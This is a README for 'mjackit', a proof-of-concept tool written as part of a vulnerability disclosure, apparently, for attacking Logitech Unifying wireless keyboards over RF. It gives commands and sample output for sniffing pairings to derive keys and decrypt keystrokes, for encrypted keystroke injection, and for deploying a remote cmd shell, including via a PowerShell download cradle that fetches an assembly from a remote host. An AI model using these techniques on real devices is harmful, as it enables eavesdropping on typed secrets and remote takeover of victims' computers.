### Foreword

*I hope this could serve as a basis for great tools (I don't have to maintain myself). As you
might have noticed, there is no licensing applied, yet. Feel free to use, change and extend
everything. But don't do it without mentioning me or to make profit out of it (no commercial
use in software or hardware products)*

# mjackit

Mjackit was planned as tool to interact with vulnerable Logitech Unifying devices from RF end
utilizing a CrazyRadioPA with a modified `nrf-research-firmware` (by Bastille / Marc Newlin).

Because I started a new Project for this (based on nRF52840), I left mjackit as it is.

This means:

- demos for all RF based Unifying vulnerabilities are included
    - PoC 1: Sniff pairing of a device, derive keys and decrypt successive traffic from this device)
    - PoC 2: 
    - force pairing
    - covert channel shell
- mjackit supports multiple keyboard layouts for injection (`SniffReplayXORPress` and `SniffReplayXORType`
accept layout as last parameter)
- the code contains many not deleted experiments and isn't well structured (I removed a ton of this
stuff before adding it to the disclosure repo)
- the code contains comments, which are partially outdated
- things which should be changeable are partially hardcoded  
- there is no real command line interface or sophisticated argument parsing (nothing like Cobra etc)


# Requirements

- CrazyRadio PA flashed with this version of nrf-research-firmware: https://github.com/mame82/nrf-research-firmware
- libusb-1.0 (native dependency, see here for details: https://github.com/google/gousb)
- Go 1.11 (minimum, for module support)

# build

`mjackit` support Go modules, which means it doesn't need to reside in Go-path to be build.

To build, enter the mjackit directory and run

`go build` 

.. this will create the `mjackit` binary. For cross-compilation refer to Go documentation and keep
in mind that libusb-1.0 is a native dependency.

# usage (linux syntax)

## pair flooding 

*Note: works fully patched on Unifying receivers*

`./mjackit pairflood`

This demo immediately pairs a device (with changing serial and device type) each time a dongle in pairing mode is 
spotted. The device type is the one visible in the Unifying software (mouse, touchpad joystick etc.), while the
actual device capabilities depend on the supported report types (int his case keyboard led, keyboard, power keys
and mouse are reported as supported RF report types).

The main reason I included this, is that the underlying code describes the meaning of the pairing RF frames better,
than any document I created (I added in the report types, to allow you to investigate the meanings of the values of
each pairing frame).

## encrypted injection (PoC 2)

*Note: works fully patched on Unifying receivers*

As most in this repo, this is PoC code and has German language layout hardcoded. To change this, you have to alter
the respective functions in `main.go` and change the `"de"` parameter of the respective function to `"us"`f.e.

The functions are marked with the comment `//change laguage layout if needed`.

Alternatively you could change the keyboard layout for the system under test to German.

Now for the injection run:

```
./mjackit xorinject
```

How to test the demo:

On the system under test open an editor (only ASCII is typed out, no payload with key combos).
Connect an encrypted Unifying keyboard to the system (otherwise this makes no sense).
`mjackit` is running in promiscuous mode, in order to discover the device on air. The PoC is not build
to deal with multiple devices on air, so keep the test setup isolated. Hit keys on the keyboard, till
`mjackit` discovered it, which is indicated by output similar to this:

```
Entering promiscuous mode and try to discover a device...
... valid ESB from address e2:c7:94:f2:db (channel 32), check if dongle is in range
Try to find dongle for potential device e2:c7:94:f2:db...
Received empty ack from dongle e2:c7:94:f2:00 on channel 32
... dongle in range
waiting for keystrokes to break encryption data

Found dongle for device e2:c7:94:f2:db on channel 32, waiting for traffic
K
0.00 percent
KK
0.00 percent
KKK
0.00 percent
... snip ...
```

As explained in the respective report, this is a known plaintext attack, which relies on LED outbound
reports. So you have to frequently hit a key which toggles a keyboard LED (NUM LOCK, CAPS LOCK or SCROLL LOCK).

This has to be done, until `mjackit` that enough data is collected, like this:

```
... snip...
KL(caps)KKL(caps)KKL(caps)KKL(caps)KKL(caps)KKL(caps)KKL(caps)KKL(caps)KKL(caps)KKL(caps)KKL(caps)KKL(caps)KKL(caps)KKL(caps)KKL(caps)K
100.00 percent
transforming encrypted key reports to blank reports...
eliminated CAPS LOCK key
eliminated CAPS LOCK key
... snip ...
```

As soon as 100 percent key data is collected, stop hitting keys immediately.
The payload (hardcoded string) should get typed out to the target.


Possible issues:
- The PoC isn't build in robust fashion. If a TX frames does not receive an ACK (after retransmit limit is reached) , 
`mjackit` re-enumerates the current channel of the dongle exactly once, before it continues typing (key presses/releases
could get lost). Because the real device is still actively sending (likely more frequent keep-alives, after key presses)
the dongle receives RF frames in high frequency, from both, the device and `mjackit`. Some of those frames
are invalid, because `mjackit` and the real device are transmitting at the same time (this is independent from
the 8ms delay between successive keystrokes, as ESB frames are re-transmitted faster if no **valid** ACK is received).
Too much invalid traffic on the channel, is interpreted as noise by the dongle and thus it could change the channel.
- If pressing keys on the real keyboard isn't stopped immediately, the dongle receives alternating keyframes from
`mjackit` and the real device. In result, the counters don't appear in successive order to the dongle. This PoC is all
about bypassing the counter re-use protection deployed after the vulnerability reports from Bastille, but it could only
work if a minimum of successive counters (sequence not interrupted) arrives. This number of successive counters is about
23 or 24 on all dongle tested. As long as 23 successive counters are cached by the dongle, they are allowed to change
once. This is likely to deal with power-cycling of real devices (counter re-initialization). If the counter changes out
of order more than once in a sequence of 23 encrypted keyboard frames, the dongle ignores successive keystrokes (until
23 successive counter are cached, again). This PoC could be used to play around with this and do some tests (f.e.
if the real keyboard stops typing). It should be noted, that the injected string has more characters than reports are 
stored, in order to demo that about 24 reports are enough for injections of arbitrary length.

## extract link encryption keys from sniffed pairing and eavesdrop encrypted keyboard traffic (PoC 1)

*Note: works fully patched on Unifying receivers*

Respective command:

```
./mjackit pairsniff
```

As long as there is no dongle in pairing mode in range, `mjackit` hops channels in order to find such
a dongle (active search ... "pinging"). Outpus looks like this:

```

=============================================================
=                         - mjackit -                       =
=                                                           =
=      Demo tool for Logitech Unifying vulnerabilities      =
=           by Marcus Mengs (MaMe82) Feb, 2019              =
=============================================================
EP In ep #1 IN (address 0x81) bulk [64 bytes]
EP Out ep #1 OUT (address 0x01) bulk [64 bytes]
Wait for dongle in pairing mode
........................................................................ ..snip..
```     

As soon as a dongle in pairing mode is in range (easiest way to set a dongle into pairing mode is the `Logitech
Unifying-Software` as the `munifying` tool isn't released, yet), the output should change to something like this:

```     
Wait for dongle in pairing mode
.......................................................................................................................
................................32, 62, .65, 14, 41, 71, 44, 74, 5, 32, 62, 35, 65, 14, 41, 71, 44, 74, 5, 32, 62, 35, 
65, 14, 41, 71, 44, 74, 5, 32, 62, 35, 65, 14, 41, 71, 44, .74, 5, 32, 62, 35, 65, 14, 41, 71, 44, 74, 5, 32, 62, 
... snip ... 
```     

The numbers indicate the channels on which the dongle is found. They should change frequently (in exactly the sequence 
shown above). If the dongle channel is constant, this means that an already paired device is connected and interacting 
with the dongle (while it is still in pairing mode). The latter does not matter (or makes things easier).

**Important, if the device under test is already paired, it has to be un-paired first**

Now you are ready to pair a device. This is done by turning it off (in not already done) and on again.
Wait some seconds ... output should look like this:

```
32, 62, 35, 65, 14, 41, 71, 44, 74, 5, 32, 62, 35, 65, 14, 41, 71, 44, 74, 5, 32, 62, 35, 65, 14, 41, 71, 44, 74, 5, 32, 62, 35, .65, 14, 41, 71, 44, 74, 5, 32, 62, 35, 65, 14, 41, 71, 44, 74, 5, 32, 62, 35, 65, 14, 41, 71, 44, 74, 5, 32, 62, 35, 65, 14, 41, 71, 44, .74, 5, 32, 62, 35, 65, 14, 41, 71, 44, 74, 5, 32, 62, 35, 65, 14, 41, 71, 44, 74, 5, 32, 62, 35, 65, 14, 41, 71, 44, 74, 5, 32, 62, 35, .65, cb 5f 01 e2 c7 94 f2 e1 14 40 04 04 02 01 0d 00 00 00 00 00 0b 4e Pairing request phase 1
Parsed pairing request 1
2b 0a ea 3d b5 b3 d0 68 52 4e 03 4f 33 c0 c1 18 54 98 a6 a7 d8 35 INVALID CHECKSUM
cb 40 01 e2 12 NOTIFICATION KEEP ALIVE
cb 1f 01 e2 c7 94 f2 e2 14 88 08 04 01 01 0d 00 00 00 00 00 00 4d Pairing response phase 1
Parsed pairing response 1
Switched addr e2:c7:94:f2:e2
00 5f 02 94 85 85 e2 0d 63 a9 c2 1a 40 00 00 02 00 00 00 00 00 e8 Pairing request phase 2
Parsed pairing request 2
2b 0a ea 3d b5 b3 d0 68 52 4e 03 4f 33 c0 c1 18 54 98 a6 a7 d8 35 INVALID CHECKSUM
00 40 02 94 2a NOTIFICATION KEEP ALIVE
00 1f 02 64 01 b9 fb 0d 63 a9 c2 1a 40 00 00 02 00 00 00 00 00 8f Pairing response phase 2
Parsed pairing response 2
Key: 08 38 e2 f2 85 6b d0 b9 94 88 9b 04 01 ae 40 e2
Encryption key calculated
00 5f 03 01 04 4b 33 36 30 00 00 00 00 00 00 00 00 00 00 00 00 b5 Pairing request phase 3
Parsed pairing request 3
00 40 02 94 2a bd c3 22 2b bf 95 59 61 f3 b0 bc ad 8d 6b 73 fb b3 INVALID CHECKSUM
00 40 03 01 bc NOTIFICATION KEEP ALIVE
00 0f 06 02 03 b9 fb 0d 63 c2 Pairing response phase 3
Parsed pairing response 3
Device: &{RfAddress:e2:c7:94:f2:e2 DevWPID:[64 4] DevSerial:[13 99 169 194] DongleWPID:[136 8] Key:[8 **redacted** 226] AesIndata:[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0] Counter:0 DevType:1 DevCaps:13 DevNonce:[148 133 133 226] DongleNonce:[100 1 185 251] DevName:K360 keyPresent:true PairingSeq:0 PairingPhase:51 EncryptedKeyboardFramesWhitened:[] nextWhitenedFrameIdx:0}
00 4f 06 01 00 00 00 00 00 aa SET KEEP ALIVE
Final request

Found dongle for device e2:c7:94:f2:e2 on channel 08, waiting for traffic

```

The important part are those two lines:

```
Parsed pairing response 3
Device: &{RfAddress:e2:c7:94:f2:e2 DevWPID:[64 4] DevSerial:[13 99 169 194] DongleWPID:[136 8] Key:[8 **redacted** 226] AesIndata:[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0] Counter:0 DevType:1 DevCaps:13 DevNonce:[148 133 133 226] DongleNonce:[100 1 185 251] DevName:K360 keyPresent:true PairingSeq:0 PairingPhase:51 EncryptedKeyboardFramesWhitened:[] nextWhitenedFrameIdx:0}
```

If this has succeeded, `mjackit` automatically toggles to sniffing mode and prints out the decrypted version
onf encrypted keyboard RF frames, like this:

```
Found dongle for device e2:c7:94:f2:e2 on channel 14, waiting for traffic
3447.3708   00D3563F3BBA3E7896E0CC6E60980000000000000045    ENCRYPTED KEYBOARD KEY REPORT (len 22)
 --> decrypted modifiers: NONE keys: KEY_A 
Keybuff:
-------
 a
3548.1748   00D326DB7B359CA22CB8CC6E60990000000000000027    ENCRYPTED KEYBOARD KEY REPORT (len 22)
 --> decrypted modifiers: NONE keys: NONE
Keybuff:
-------
 a
214550.3906 00D3BF5CCA93CC59C19ACC6E609A0000000000000001    ENCRYPTED KEYBOARD KEY REPORT (len 22)
 --> decrypted modifiers: NONE keys: KEY_F 
Keybuff:
-------
 af
```

### causes of errors, possible issues

If the output looks different after some seconds, the pairing failed (indicated in Unifying software) or
the pairing succeeded, without `mjackit` beeing able to sniff it, the whole procedure has to be repeated.
(`mjackit` could be interrupted with `CTRL + C`)

I had serious issues using the Unifying dongle on an USB 3.0 port (likely because of interference in
2.4GHz ISM band), so giving USB 2.0 a shot could help.

Again, this PoC isn't built to work robust, beside the USB 3.0 there are other issues. For example following
the dongle during channel hopping is done by sending very short ESB frames and watching for respective ACKs.
If they don't arrive, the channel is changed, till the dongle is hit again. Transmitting to the dongle, while
it is listening for pairing communication involves obvious problems:

1) While `mjackit` is in TX mode it can't receive transmissions from the actual device, thus pairing traffic
could be missed.
2) If the device and `mjackit` transmit at the same time on the same channel, the frames collide and end up
as garbage. `mjackit`'s retransmission count and frame length are low, to compensate for that ... still it is a
problem. This is especially true for pairing, as some of the frames are only sent once by the device which
tries to pair (no retransmission, pairing would fail).
3) Lastly, under under unfavourable conditions, a TX frame from Logitacker could be regarded as ACK frame from
perspective of the device (if ithits the short time window, when the device toggles to PRX in order to receive)
an ACK. This would disrupt the pairing process, as the "ping" frames in use don't carry valid pairing responses
as expected from the device.

In addition, the approach in use to follow the dongle along while it is channel hopping, is a bit naive.
Although it accounts for the estimated channel order (no long ping sweeps accross multiple channels), there is
no logic to sync the "ping" requests of `mjackit` with the channel hopping interval of the Unifying dongle
(or phase / point in time of a hop). Again, this is a PoC, but implementing a more adaptive logic could greatly 
improve reliability and reduce TX interference. Not being in sync, on the other hand, increases the risk of missing
frames sent by the device. In worse case, `mjackit` would hit the dongle on its current channel and start listening 
for incoming traffic (for several milliseconds), shortly before the dongle hops again (a fraction of milliseconds).
This would mean `mjackit` listens on the wrong channel for a large amount of time.  

I considered most of this issues, but regarded neither one during implementation of the PoC.

An interesting thing I haven't tested so far, is "channel fixation". It seems that if there is already a paired
device (known by the attacker), sending keep-alives from this devices locks the dongle on a channel, while ??pairing
mode is still working??.

To make a long story short: Sniffed pairing is a realistic scenario, even if the demo isn't coded in robust fashion
This is even more true, because the security implications pointed out in Report 1 are related to weak key exchange, 
not to reliable sniffing (which could be done in multiple ways, we have low cost SDRs, right?!)

## relaying a shell through an unmodified Unifying dongle (initial research goal and the fun part)

*Note: works fully patched on Unifying receivers*

I don't go into great detail for protocol integration / low level stuff, here. We still have github issues for this.

The client side agent for the remote shell has already been provided here: https://github.com/mame82/UnifyingVulnsDisclosureRepo/tree/master/tools/unifying_shell_CLR_client_agent

`mjackit` includes the respective server component and some code to deploy the client agent via keystroke injection
(PowerShell payload).

The client agent is tested on Win 7 and Win 10. It was only tested in x86 PowerShell sessions (even on 64bit boxes),
as it uses native Win32 APIs (PInvoke) for USB HID access. The agent **does not require elevated privileges**. The demo
targets Windows only (Linux is perfectly possible following the same principles, even easier because "everything is a file").

The actual code of the client agent is a .NET assembly, which is loaded into a PowerShell session. Usually, everything
runs in-memory, there is no persistence (reboot helps, if there are doubts). As this is a demo, there is no stub
to hide the console window on the client, neither is there fancy obfuscation or encryption for C2 traffic.
The client agent simply binds to STDERR/STDOUT/STDIN of a spawned `cmd.exe` process, which by itself should be loud
enough to prevent abuse of the demo. 

The shell could be deployed in multiple ways, so lets start with the easiest one.

### manually triggering the client side agent

*Note: works fully patched on Unifying receivers*

This requires knowledge of one of the device RF addresses used by the Unifying dongle, in order to provide a valid
peer to the server part (`./mjackit discoversniff` could help to determine such a device address).

The folder of the client agent holds a file called `runner_net20.ps1`. It could be used to start the agent on the
client (f.e. by copying&pasting the content to a **x86** PowerShell console or directly starting the script, if the 
ExecutionPolicy is set properly).

Once the client agent is started, the server could be started with this command:

```
./mjackit covert e2:c7:94:f2:e2
```

In this case `e2:c7:94:f2:e2` is a known and valid device RF address from the Unifying dongle, connected to the client.

The server output should look something like this (depends on the client system):

```

=============================================================
=                         - mjackit -                       =
=                                                           =
=      Demo tool for Logitech Unifying vulnerabilities      =
=           by Marcus Mengs (MaMe82) Feb, 2019              =
=============================================================
EP In ep #1 IN (address 0x81) bulk [64 bytes]
EP Out ep #1 OUT (address 0x01) bulk [64 bytes]
launching covert channel server for target RF address e2:c7:94:f2:e2covert channel RF synced ... current tx seq 00, last rx seq 00
... covert channel server running
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Alle Rechte vorbehalten.

C:\Users\USB>

```

Voila ... a remote shell. The console window on the client mirrors all input and output. Considering the bandwith
of the underlying channel, the shell is pretty responsive. **I'd like to emphasize the fact, that the dongle, as well
as the connected devices are still working as intended, while the shell is running**

### deployment using keystroke injection

*Note: works fully patched on Unifying receivers*

The exact same technique as describe in chapter "encrypted injection (PoC 2)" is used, to carry out the keystroke
injection (target device is discovered based keystrokes, injection starts as soon as enough LED reports are collected).

In contrast to the first approach, no device RF address has to be known upfront, as it discovered "on air".
The same issues apply, though.

The keystroke injection uses a PowerShell download cradle, utilizing `Net.WebClient`'s `DownloadString` method, to load
the .NET assembly with the client agent into memory.

The assembly is hosted here: https://github.com/mame82/tests/blob/master/old/test2.b64

The command to run this version of the shell:

```
./mjackit covertauto2
```

Now hit LED toggle keys on the Unifying device, till the `mjackit` captured a 100% key sequence for encrypted injection.
There is a little countdown, before injection starts ... this is the time frame you have, to assure CAPS LOCK is
disabled after all the LED toggling (otherwise it gets a bit hard to type out valid code ... NUM LOCK is your friend, 
if present on the Logitech keyboard). 
 
Of course, this version requires Internet access for the system under test.

Intended output on `mjackit`'s end:

```

=============================================================
=                         - mjackit -                       =
=                                                           =
=      Demo tool for Logitech Unifying vulnerabilities      =
=           by Marcus Mengs (MaMe82) Feb, 2019              =
=============================================================
Waiting for device keystrokes to deploy covert channel...

EP In ep #1 IN (address 0x81) bulk [64 bytes]
EP Out ep #1 OUT (address 0x01) bulk [64 bytes]
Entering promiscuous mode and try to discover a device...
... valid ESB from address e2:c7:94:f2:e2 (channel 35), check if dongle is in range
Try to find dongle for potential device e2:c7:94:f2:e2...
Received empty ack from dongle e2:c7:94:f2:00 on channel 35
... dongle in range
waiting for keystrokes to break encryption data

Found dongle for device e2:c7:94:f2:e2 on channel 35, waiting for traffic
K
0.00 percent

0.00 percent
K
0.00 percent
K
0.00 percent
KK
0.00 percent
KKL(num)
6.67 percent
...snip...
KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KK
93.33 percent
KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)
6.67 percent
KL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)KKL(num)K
100.00 percent
transforming encrypted key reports to blank reports...
eliminated NUM LOCK key
...snip...
eliminated NUM LOCK key
Injecting keystrokes for covert channel agent in ...
	5 ...	4 ...	3 ...	2 ...	1 ...enough keystrokes stored for device, to break encryption
enough keystrokes stored for device, to break encryption
enough keystrokes stored for device, to break encryption
Finished typing, launching covert channel server...
EP In ep #1 IN (address 0x81) bulk [64 bytes]
EP Out ep #1 OUT (address 0x01) bulk [64 bytes]
launching covert channel server for target RF address e2:c7:94:f2:e2covert channel RF synced ... current tx seq 00, last rx seq 00
... covert channel server running
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Alle Rechte vorbehalten.

C:\Users\USB>
```

### deployment using keystroke injection - air gapped target

*Note: works fully patched on Unifying receivers*

This versions works exactly like the previous one, with a small difference: Instead of using a download
cradle, the whole .NET assembly is typed out (nearly 7000 characters).

I consider this to be a toy demo, because:

1) Typing speed is way to slow (because of the intervals between key presses enforced by the Unifying dongle).
Typing out the whole payload takes roughly two seconds
2) If only a single character is missing during injection (I mentioned multiple causes for this throughout this README)
the whole payload would not work (and it takes roughly 2 minutes to get to the point to recognize the error).

Anyways, beside being a toy demo, it shows that with about 15 to 20 hits on a keyboard a host with a Unifying dongle
(which is otherwise air gapped) could be accessed remotely. If the brute-force approach would have worked, there would
be no physical access required, at all.


# additional info

The `TestKeystrokeInjection` function in `main.go` shows a manual keystroke injection for a known address and
link encryption key.

The `TestUnknownSniff()` function in `main.go` starts sniffing the first RF address found in promiscuous mode
(because of the modifications to the nrf-research-firmware, ACK frames with and without payloads are sniffed, too)

## Forced pairing

I haven't added a command line argument to run a forced pairing, but it is easy to add:

If you follow along the code called by `./mjackit pairflood` in `main.go`, you will end up at a method called
`SimulatePairingDevice` which again calls `SimulatePairingDeviceForced`. The parameter `unifying.LogitechPairingAddr`
which is handed in to the latter method, represents the Global pairing address `bb:0a:dc:a5:75`.

This argument could simply be replaced with a RF address, known to be vulnerable to forced pairing, written like
this: `unifying.Nrf24Addr{0x01, 0x02, 0x03, 0x04, 0x05}`

## Dongle Emulation

`main.go` implements a (very old) method, which allows emulating a dongle in pairing mode.
The method is called `SimulatePairingDongle` and part of the `main()` function, although never reached, because
`return` statements have be used to "comment out" unused code (so sorry for not cleaning this mess up).

Emulating a dongle could come in handy (f.e. report 1 mentions an idea on how to pair non-Unifying devices to Unifying 
dongles)  
 




